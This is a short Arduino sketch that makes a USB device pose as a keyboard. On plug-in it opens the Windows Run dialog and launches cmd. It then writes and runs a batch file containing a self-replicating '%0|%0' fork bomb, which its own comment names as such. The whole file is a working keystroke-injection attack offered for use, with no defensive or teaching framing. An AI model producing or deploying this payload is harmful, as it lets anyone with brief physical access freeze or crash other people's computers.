#include<Keyboard.h>
void setup() {
pinMode(13,OUTPUT);
Keyboard.begin();
Keyboard.releaseAll();
delay(2000);
Keyboard.press(KEY_LEFT_GUI);
Keyboard.press('r');
Keyboard.releaseAll();
delay(100);
Keyboard.print("cmd");
Keyboard.press(KEY_RETURN);
Keyboard.release(KEY_RETURN);
delay(100);
Keyboard.print("echo %0^|%0 >system.bat");
Keyboard.press(KEY_RETURN);
Keyboard.release(KEY_RETURN);
delay(100); 
Keyboard.print("system.bat"); // deploy fork bomb on windows 
Keyboard.press(KEY_RETURN);
Keyboard.release(KEY_RETURN);
digitalWrite(13,HIGH);

}

void loop() {
  // nothing here

}
